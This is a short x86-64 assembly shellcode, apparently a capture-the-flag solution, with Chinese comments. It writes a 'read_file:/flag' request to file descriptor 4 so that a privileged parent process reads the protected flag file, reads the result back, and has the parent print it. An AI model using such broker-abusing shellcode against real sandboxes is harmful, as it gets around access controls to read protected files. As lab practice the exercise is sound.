# 1. 这题需要通信给father, 让它去读/flag
# 2. 之后再通过数据口读回来
# 3. 最后调用print_msg来输出
# 4. 全程操作FD 4

.global _start
_start:
.intel_syntax noprefix
        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx
        # write(4, "read_file:/flag", 100)
        mov rax, 1
        mov rdi, 4
        lea rsi, [rip+read]
        mov rdx, 100
        syscall
        # read(4, *buff, 100)
        mov rax, 0
        lea rsi, [rip+data+10]
        syscall
        # write(4, "print_msg:data", 100)
        mov rax, 1
        lea rsi, [rip+data]
        syscall
read:
        .string "read_file:/flag"
data:
        .string "print_msg:"
